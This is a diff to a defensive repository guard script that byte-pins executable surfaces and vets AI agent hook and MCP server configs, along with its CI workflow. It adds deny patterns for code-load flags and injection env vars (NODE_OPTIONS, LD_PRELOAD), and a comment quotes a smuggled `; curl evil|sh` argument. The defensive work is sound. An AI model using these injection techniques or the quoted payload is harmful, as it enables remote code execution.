@@ -17,10 +17,12 @@
  * trees that can't be byte-pinned (lib/, app/, …).
  *
  * FAIL-CLOSED: the optional security/guard.config.json can only make the guard
- * STRICTER — coverage lists are UNIONed with the defaults (never shrunk),
- * maxFileBytes can only drop, and mcpAllowlist additions are validated. The config
- * + pins live under security/, which is itself a pinned surface and must be
- * code-owned (.github/CODEOWNERS), so it cannot silently disarm the guard.
+ * STRICTER — it must be a TRACKED file (an untracked/gitignored config is IGNORED
+ * and flagged); coverage lists are UNIONed with the defaults (never shrunk),
+ * maxFileBytes can only drop, mcpAllowlist additions are validated, and
+ * oversizeAllowlist is NOT user-widenable (widening it would exempt a payload). The
+ * config + pins live under security/, a pinned + code-owned surface, so it cannot
+ * silently disarm the guard.
  *
  * ── DROP INTO ANY REPO ──
  *     cp scripts/guard-surfaces.mjs <repo>/scripts/
@@ -29,8 +31,10 @@
  *     node scripts/guard-surfaces.mjs --update   # re-pin after a legit change
  *     node scripts/guard-surfaces.mjs --global [--update]   # machine-local config drift
  *
- * CI MUST run this from a TRUSTED ref (the base branch), not the PR head, so a PR
- * cannot grade its own homework — see .github/workflows/test.yml.
+ * CI runs the guard CODE from a TRUSTED ref (the base branch), not the PR head, so a
+ * PR can't weaken the guard LOGIC. The PINS are read from the PR head, so a re-pinned
+ * trojan is stopped by the CODEOWNERS review gate on security/ (keep it ON), not by
+ * CI — see .github/workflows/test.yml and SECURITY.md.
  *
  * Pure helpers are exported for unit tests; fs/git/process live in the runner.
  */
@@ -108,6 +112,18 @@ const SHELL_CMDS = new Set([
   "powershell", "powershell.exe", "pwsh", "pwsh.exe",
 ]);
 
+// Interpreter flags that run arbitrary code BEFORE/instead of the main script
+// (inline-eval AND module-preload — the latter, -r/--require/--import/--loader,
+// runs an attacker module's top level before main). A standalone token only.
+const CODE_LOAD_FLAG =
+  /(^|\s)(-e|--eval|-p|--print|-c|-r|--require|--import|--loader|--experimental-loader)(\s|=|$)/;
+
+// Env vars that inject code into a spawned interpreter regardless of argv.
+const DANGEROUS_ENV =
+  /^(NODE_OPTIONS|NODE_REPL_EXTERNAL_MODULE|BUN_INSPECT|DENO_|LD_PRELOAD|LD_AUDIT|DYLD_INSERT_LIBRARIES|DYLD_FRAMEWORK_PATH|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT)$/i;
+
+const META_RE = /[;&|`$(){}<>#\n]|&&|\|\|/; // shell metachars / chaining / comment
+
 // ── pure helpers (unit-tested) ──
 
 export function sha256(content) {
@@ -135,11 +151,20 @@ export function findMcpServers(obj) {
     const map = obj[mapKey];
     if (!map || typeof map !== "object" || Array.isArray(map)) continue;
     for (const [name, def] of Object.entries(map)) {
-      const command =
-        def && typeof def === "object" && typeof def.command === "string" ? def.command : "";
-      const args =
-        def && typeof def === "object" && Array.isArray(def.args) ? def.args.join(" ") : "";
-      out.push({ name, command, args });
+      const isObj = def && typeof def === "object";
+      const command = isObj && typeof def.command === "string" ? def.command : "";
+      // args may be an ARRAY or a raw STRING — accept both. (Coercing a string to
+      // "" let `{command:"ok",args:"; curl evil|sh"}` skip the metachar check.)
+      const args = isObj
+        ? Array.isArray(def.args)
+          ? def.args.join(" ")
+          : typeof def.args === "string"
+            ? def.args
+            : ""
+        : "";
+      // env can smuggle code into a spawned interpreter (NODE_OPTIONS=--require …).
+      const env = isObj && def.env && typeof def.env === "object" && !Array.isArray(def.env) ? def.env : {};
+      out.push({ name, command, args, env });
     }
   }
   return out;
@@ -147,27 +172,32 @@ export function findMcpServers(obj) {
 
 /**
  * STRUCTURED allow check (not a raw substring): an MCP server is allowed only if
- *   - its command is not a shell (sh/bash/cmd/powershell/…) or an inline-eval node,
- *   - the command line has no shell metacharacters / chaining / comments, AND
- *   - some allowlist entry EXACTLY equals a path-segment basename (sans extension)
- *     of the command or any arg.
- * This blocks substring decoys, typosquats, comment-smuggling, and shell wrappers.
+ *   - its command is not a shell (sh/bash/cmd/powershell/…),
+ *   - the command line has no shell metacharacters / chaining / comments,
+ *   - no interpreter code-load flag (-e/-p/-c/-r/--require/--import/--loader),
+ *   - no code-injecting env var (NODE_OPTIONS / LD_PRELOAD / …), AND
+ *   - some allowlist entry EXACTLY equals the BASENAME (sans extension) of the
+ *     command or an arg — NOT an intermediate directory segment (else
+ *     `node /tmp/orchestration-server/evil.js` would be allowed by the dir name).
+ * This blocks substring decoys, typosquats, comment-smuggling, shell/preload
+ * wrappers, and directory-name spoofing.
  */
-export function isAllowedMcpServer({ command, args }, allowlist) {
+export function isAllowedMcpServer({ command, args, env } = {}, allowlist) {
   const cmd = String(command || "").trim();
   const a = String(args || "").trim();
-  const combined = `${cmd} ${a}`;
-  if (/[;&|`$(){}<>#\n]|&&|\|\|/.test(combined)) return false; // metachars / chaining / comment
-  const base = basename(cmd).toLowerCase();
-  if (SHELL_CMDS.has(base)) return false;
-  if (/^(node|deno|bun)(\.exe)?$/.test(base) && /(^|\s)(-e|--eval|-p|--print|-c)(\s|$)/.test(a)) {
-    return false; // inline-eval interpreter
+  if (META_RE.test(`${cmd} ${a}`)) return false; // metachars / chaining / comment
+  if (SHELL_CMDS.has(basename(cmd).toLowerCase())) return false;
+  if (CODE_LOAD_FLAG.test(` ${a} `)) return false; // inline-eval / module-preload
+  for (const [k, v] of Object.entries(env && typeof env === "object" ? env : {})) {
+    if (DANGEROUS_ENV.test(k)) return false;
+    if (typeof v === "string" && (META_RE.test(v) || CODE_LOAD_FLAG.test(` ${v} `))) return false;
   }
-  const segs = [cmd, ...a.split(/\s+/)]
-    .flatMap((t) => t.split(/[\\/]+/))
-    .map((s) => s.replace(/\.[^.]+$/, ""))
+  // BASENAME of each whitespace token only — directory segments don't count.
+  const bases = [cmd, ...a.split(/\s+/)]
+    .filter(Boolean)
+    .map((t) => basename(t).replace(/\.[^.]+$/, ""))
     .filter(Boolean);
-  return (allowlist || []).some((allow) => segs.includes(allow));
+  return (allowlist || []).some((allow) => bases.includes(allow));
 }
 
 /** Back-compat default for Stoa's own orchestration MCP server. */
@@ -217,9 +247,10 @@ export function checkPackageScripts(pkg, pinnedScripts) {
   return violations;
 }
 
-/** Local file paths (with a script extension) invoked by a script command. */
+/** Local file paths (with a script extension) invoked by a script command.
+ * Case-insensitive: on Windows / default macOS, `node tools/Run.JS` executes. */
 export function scriptFileTargets(cmd) {
-  const re = /(?:^|[\s;&|=("'`])((?:\.{0,2}\/)?[\w./\\-]+\.(?:js|mjs|cjs|ts|mts|cts|sh|bash|zsh|py|rb|ps1|psm1|bat|cmd|pl|php|lua))/g;
+  const re = /(?:^|[\s;&|=("'`])((?:\.{0,2}\/)?[\w./\\-]+\.(?:js|mjs|cjs|ts|mts|cts|sh|bash|zsh|py|rb|ps1|psm1|bat|cmd|pl|php|lua))/gi;
   const out = [];
   let m;
   while ((m = re.exec(String(cmd))) !== null) {
@@ -232,11 +263,18 @@ export function scriptFileTargets(cmd) {
  * be byte-pinned (excludes husky's _/ cache and the pins manifest itself, which
  * cannot pin its own hash). */
 export function discoverSurfaceFiles(relFiles, surfaceDirs, surfaceFiles = []) {
-  const roots = new Set(surfaceFiles);
-  const under = (rel) =>
-    roots.has(rel) || surfaceDirs.some((d) => rel === d || rel.startsWith(d + "/"));
+  // Case-INSENSITIVE matching: on macOS APFS / Windows NTFS (both supported, both
+  // case-insensitive by default), an agent loads `.Cursor/hooks.json` identically
+  // to `.cursor/`, so case-exact matching would let a case-folded surface evade
+  // the byte-pin entirely. Compare lowercased; keep the original rel for hashing.
+  const roots = new Set(surfaceFiles.map((f) => f.toLowerCase()));
+  const dirsLc = surfaceDirs.map((d) => d.toLowerCase());
+  const under = (rel) => {
+    const lc = rel.toLowerCase();
+    return roots.has(lc) || dirsLc.some((d) => lc === d || lc.startsWith(d + "/"));
+  };
   return relFiles
-    .filter((f) => under(f) && !f.startsWith(".husky/_/") && f !== PINS_PATH)
+    .filter((f) => under(f) && !f.toLowerCase().startsWith(".husky/_/") && f !== PINS_PATH)
     .sort();
 }
 
@@ -271,17 +309,31 @@ function safeAllowEntry(s) {
  * Coverage lists are UNIONed with the defaults (an attacker can't shrink them);
  * maxFileBytes can only decrease; mcpAllowlist additions are validated; skipDirs
  * can never include a surfaceDir.
+ *
+ * TRUST: the config is only honored if it is a TRACKED file (pass the `tracked`
+ * set). An untracked / gitignored security/guard.config.json is IGNORED (it never
+ * appears in CODEOWNERS-reviewed history and would otherwise be a silent foothold);
+ * the caller is told via cfg.untrustedConfig and raises a violation. When `tracked`
+ * is omitted (e.g. updatePins), the config is honored — but even then it cannot
+ * DISARM the guard: oversizeAllowlist is NOT user-widenable (widening it would
+ * exempt a payload from the oversize check), and every other override only widens
+ * coverage or tightens a limit.
  */
-export function loadConfig(root) {
+export function loadConfig(root, { tracked } = {}) {
   const cfg = { ...DEFAULTS };
-  const text = readText(root, CONFIG_PATH);
+  const exists = existsSync(join(root, CONFIG_PATH));
+  const untrusted = exists && tracked instanceof Set && !tracked.has(CONFIG_PATH);
+  cfg.untrustedConfig = untrusted ? CONFIG_PATH : null;
+  const text = exists && !untrusted ? readText(root, CONFIG_PATH) : null;
   const parsed = text ? readJson(text) : { ok: false };
   const raw = parsed.ok && raw_obj(parsed.value) ? parsed.value : {};
 
   cfg.surfaceDirs = uniq([...DEFAULTS.surfaceDirs, ...asArr(raw.surfaceDirs)]);
   cfg.surfaceFiles = uniq([...DEFAULTS.surfaceFiles, ...asArr(raw.surfaceFiles)]);
   cfg.scriptExts = uniq([...DEFAULTS.scriptExts, ...asArr(raw.scriptExts)]);
-  cfg.oversizeAllowlist = uniq([...DEFAULTS.oversizeAllowlist, ...asArr(raw.oversizeAllowlist)]);
+  // oversizeAllowlist is NOT user-widenable — adding a basename here would DISABLE
+  // the >maxFileBytes payload check for that file (a disarm, not a widen).
+  cfg.oversizeAllowlist = [...DEFAULTS.oversizeAllowlist];
   cfg.agentConfigDirs = uniq([...DEFAULTS.agentConfigDirs, ...asArr(raw.agentConfigDirs)]);
   cfg.agentConfigFiles = uniq([...DEFAULTS.agentConfigFiles, ...asArr(raw.agentConfigFiles)]);
   cfg.localConfigFiles = uniq([...DEFAULTS.localConfigFiles, ...asArr(raw.localConfigFiles)]);
@@ -351,17 +403,40 @@ function listFiles(root, skipDirs) {
   return { files: walked, tracked: new Set(walked) };
 }
 
+/** Surface-file candidate set for pin/scan: the git list ∪ a DIRECT walk of each
+ * surface dir (so a gitignored drop inside a surface dir — which `git ls-files`
+ * omits — is still seen) ∪ any existing root surfaceFile. */
+function surfaceCandidates(root, cfg, files, skipDirs) {
+  const set = new Set(files);
+  for (const d of cfg.surfaceDirs) {
+    const abs = join(root, d);
+    if (existsSync(abs)) for (const f of walkRel(root, skipDirs, abs)) set.add(f);
+  }
+  for (const f of cfg.surfaceFiles) if (existsSync(join(root, f))) set.add(f);
+  return discoverSurfaceFiles([...set], cfg.surfaceDirs, cfg.surfaceFiles);
+}
+
 // ── runner ──
 
 /** Scan a repo root. Returns { violations, warnings }. */
 export function runGuard(root) {
-  const cfg = loadConfig(root);
-  const skipDirs = new Set(cfg.skipDirs);
-  const scriptExts = new Set(cfg.scriptExts);
-  const oversize = new Set(cfg.oversizeAllowlist);
   const violations = [];
   const warnings = [];
-  const { files, tracked } = listFiles(root, skipDirs);
+  // Enumerate first — the tracked set decides config trust + violation routing.
+  // DEFAULT skipDirs here: the git path ignores them, and the walk fallback only
+  // over-includes (fail-safe) if config later widens skipDirs.
+  const { files, tracked } = listFiles(root, new Set(DEFAULTS.skipDirs));
+  const cfg = loadConfig(root, { tracked });
+  const skipDirs = new Set(cfg.skipDirs);
+  const scriptExts = new Set(cfg.scriptExts.map((e) => e.toLowerCase()));
+  const oversize = new Set(cfg.oversizeAllowlist);
+
+  // 0. An untracked / gitignored guard config is IGNORED and is itself a violation
+  //    (it can't be CODEOWNERS-reviewed, so it must not silently widen / foothold).
+  if (cfg.untrustedConfig)
+    violations.push(
+      `${cfg.untrustedConfig}: untracked guard config IGNORED — it must be a tracked, code-owned file (commit it or remove it)`
+    );
 
   // 1. package.json scripts vs the pin (whole block; covers test/build/all).
   const pinsParsed = (() => {
@@ -392,24 +467,43 @@ export function runGuard(root) {
     } else violations.push("package.json: unparseable JSON");
   }
 
-  // 2. Pinned surface files: byte-for-byte (EOL-normalized), any ext/size.
-  const surface = discoverSurfaceFiles(files, cfg.surfaceDirs, cfg.surfaceFiles);
+  // 2. Pinned surface files: byte-for-byte (EOL-normalized), any ext/size. The
+  //    candidate set unions the git list with a DIRECT walk of each surface dir, so
+  //    a gitignored drop in a surface dir (git ls-files omits it) is still SEEN.
+  //    Routing: a TRACKED (committed) surface that's unpinned/changed is a VIOLATION
+  //    (the committed-attack + legit-re-pin path); an UNTRACKED / gitignored one is
+  //    an ADVISORY warning — it isn't in the committed tree (so it can't be a PR
+  //    attack), just a local artifact worth surfacing. A CHANGED pin is always a
+  //    violation (a known surface was tampered).
+  const surface = surfaceCandidates(root, cfg, files, skipDirs);
   for (const rel of surface) {
     const content = readText(root, rel);
     if (content == null) continue;
     const hash = hashContent(content);
-    if (!(rel in pinnedFiles)) violations.push(`${rel}: new unpinned executable surface file`);
+    if (!(rel in pinnedFiles))
+      (tracked.has(rel) ? violations : warnings).push(
+        tracked.has(rel)
+          ? `${rel}: new unpinned executable surface file`
+          : `${rel}: untracked/gitignored surface file (not pinned) — review it`
+      );
     else if (pinnedFiles[rel] !== hash) violations.push(`${rel}: content changed from its pinned hash`);
   }
   for (const rel of Object.keys(pinnedFiles))
     if (!surface.includes(rel) && !existsSync(join(root, rel)))
       violations.push(`${rel}: pinned surface file is gone (moved/deleted?)`);
 
-  // 3. Agent configs — hooks + MCP servers (Claude/Codex/Hermes). Parse failure is
-  //    itself a violation. Tracked → violation; untracked local → advisory warning.
+  // 3. Agent configs — hooks + MCP servers (Claude/Cursor/Gemini JSON; Codex/Hermes
+  //    TOML is byte-pinned only, see SECURITY.md). Parse failure is itself a
+  //    violation. Matching is case-INSENSITIVE (a tracked `.Cursor/mcp.json` loads
+  //    identically on macOS/Windows). Tracked → violation; untracked local → advisory.
+  const cfgFilesLc = new Set(cfg.agentConfigFiles.map((f) => f.toLowerCase()));
+  const cfgDirsLc = cfg.agentConfigDirs.map((d) => d.toLowerCase());
   const configRels = new Set(cfg.agentConfigFiles);
-  for (const rel of files)
-    if (cfg.agentConfigDirs.some((d) => rel.startsWith(d + "/")) && rel.endsWith(".json")) configRels.add(rel);
+  for (const rel of files) {
+    const lc = rel.toLowerCase();
+    if (cfgFilesLc.has(lc) || (cfgDirsLc.some((d) => lc.startsWith(d + "/")) && lc.endsWith(".json")))
+      configRels.add(rel);
+  }
   for (const localCfg of cfg.localConfigFiles)
     if (!tracked.has(localCfg) && existsSync(join(root, localCfg))) configRels.add(localCfg);
   for (const rel of configRels) {
@@ -428,11 +522,11 @@ export function runGuard(root) {
     }
     const hooks = findHooksKeys(parsed.value);
     if (hooks.length)
-      sink.push(`${rel}: contains hook definition(s) [${hooks.join(", ")}] — auto-executes on Claude/MCP events`);
+      sink.push(`${rel}: contains hook definition(s) [${hooks.join(", ")}] — auto-executes on agent events`);
     for (const s of findMcpServers(parsed.value))
       if (!isAllowedMcpServer(s, cfg.mcpAllowlist))
         sink.push(
-          `${rel}: defines MCP server "${s.name}" (command: ${`${s.command} ${s.args}`.trim()}) — auto-launches when a Claude/Codex/Hermes agent starts`
+          `${rel}: defines MCP server "${s.name}" (command: ${`${s.command} ${s.args}`.trim()}) — auto-launches when a Claude/Cursor/Gemini/Codex/Hermes agent starts`
         );
   }
 
@@ -454,7 +548,7 @@ export function runGuard(root) {
       violations.push(`${rel}: ${(size / 1e6).toFixed(1)} MB — oversized; possible dropped payload`);
       continue;
     }
-    if (scriptExts.has(extOf(rel)) && size <= cfg.maxFileBytes) {
+    if (scriptExts.has(extOf(rel).toLowerCase()) && size <= cfg.maxFileBytes) {
       const content = readText(root, rel);
       if (content != null && isLikelyMinified(content)) violations.push(`${rel}: minified/obfuscated source`);
     }
@@ -463,14 +557,19 @@ export function runGuard(root) {
   return { violations, warnings };
 }
 
-/** Regenerate security/surface-pins.json from the current tree (tracked ∪ untracked). */
+/** Regenerate security/surface-pins.json from the current tree. Pins only TRACKED
+ * surface files — a committed manifest must not pin a local/untracked artifact (it
+ * would read as "gone" on a fresh clone). Gitignored surface drops are intentionally
+ * left unpinned, so the guard reports them as an advisory (see runGuard step 2). */
 export function updatePins(root) {
-  const cfg = loadConfig(root);
-  const { files } = listFiles(root, new Set(cfg.skipDirs));
+  const { files, tracked } = listFiles(root, new Set(DEFAULTS.skipDirs));
+  const cfg = loadConfig(root, { tracked });
+  const skipDirs = new Set(cfg.skipDirs);
   const pkgText = readText(root, "package.json");
   const pkg = pkgText ? JSON.parse(pkgText) : {};
   const pinnedFiles = {};
-  for (const rel of discoverSurfaceFiles(files, cfg.surfaceDirs, cfg.surfaceFiles)) {
+  for (const rel of surfaceCandidates(root, cfg, files, skipDirs)) {
+    if (!tracked.has(rel)) continue; // pin tracked surfaces only
     const content = readText(root, rel);
     if (content != null) pinnedFiles[rel] = hashContent(content);
   }
@@ -503,12 +602,52 @@ export function extractGlobalSurfaces(rel, content) {
     let m;
     while ((m = re.exec(content)) !== null) names.add(m[1] || m[2]);
   }
-  const inline = /(?:^|\n)\s*(?:mcp_servers|mcpServers)\s*=\s*\{([^}]*)\}/g;
-  let im;
-  while ((im = inline.exec(content)) !== null) {
-    for (const km of im[1].matchAll(/(?:"([^"]+)"|([A-Za-z0-9_.-]+))\s*=/g)) names.add(km[1] || km[2]);
+  // inline table: mcp_servers = { a = { command="x" }, b = {...} }. Regex can't
+  // balance nested braces (env sub-tables), so scan brace depth manually and take
+  // the TOP-LEVEL keys (each `name = {…}` is one server) — the old [^}]* form
+  // truncated at the first nested `}`, mis-naming servers and missing later ones.
+  for (const body of inlineTableBodies(content)) {
+    for (const part of splitTopLevel(body)) {
+      const km = /^[\s,]*(?:"([^"]+)"|([A-Za-z0-9_.-]+))\s*=/.exec(part);
+      if (km) names.add(km[1] || km[2]);
+    }
   }
   return { mcpServers: [...names].sort(), hooks: /(^|\n)\s*\[?\s*hooks\b/i.test(content) };
+}
+
+/** Brace-balanced bodies of each `mcp_servers = { … }` inline TOML table. */
+function inlineTableBodies(content) {
+  const bodies = [];
+  const start = /(?:^|\n)[ \t]*(?:mcp_servers|mcpServers)[ \t]*=[ \t]*\{/g;
+  let m;
+  while ((m = start.exec(content)) !== null) {
+    let i = m.index + m[0].length; // just past the opening brace
+    let depth = 1;
+    const from = i;
+    for (; i < content.length && depth > 0; i++) {
+      if (content[i] === "{") depth++;
+      else if (content[i] === "}") depth--;
+    }
+    bodies.push(content.slice(from, depth === 0 ? i - 1 : i));
+  }
+  return bodies;
+}
+
+/** Split a TOML inline-table body on DEPTH-0 commas (ignore commas inside nested
+ * `{ … }` sub-tables), so each part is one top-level `name = value` assignment. */
+function splitTopLevel(body) {
+  const parts = [];
+  let depth = 0, cur = "";
+  for (const c of body) {
+    if (c === "{") depth++;
+    else if (c === "}") depth--;
+    if (c === "," && depth === 0) {
+      parts.push(cur);
+      cur = "";
+    } else cur += c;
+  }
+  if (cur.trim()) parts.push(cur);
+  return parts;
 }
 
 function snapshotGlobal(home, targets) {
@@ -600,9 +739,11 @@ jobs:
       - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
         with:
           node-version: 20
-      # Run the guard from a TRUSTED ref (base branch), not the PR head, so a PR
-      # cannot neuter the guard and pass its own check. Falls back to the PR copy
-      # only to bootstrap (before the guard exists on the base branch).
+      # Run the guard CODE from a TRUSTED ref (base branch), not the PR head, so a
+      # PR cannot weaken the guard LOGIC and pass its own check. (Pins/config are
+      # read from the PR head; a re-pinned trojan is blocked by the CODEOWNERS gate
+      # on security/, so keep "Require review from Code Owners" ON.) Falls back to
+      # the PR copy only to bootstrap (before the guard exists on the base branch).
       - run: |
           git fetch --no-tags --depth=1 origin "\${{ github.base_ref || 'main' }}" 2>/dev/null || true
           if git cat-file -e FETCH_HEAD:scripts/guard-surfaces.mjs 2>/dev/null; then
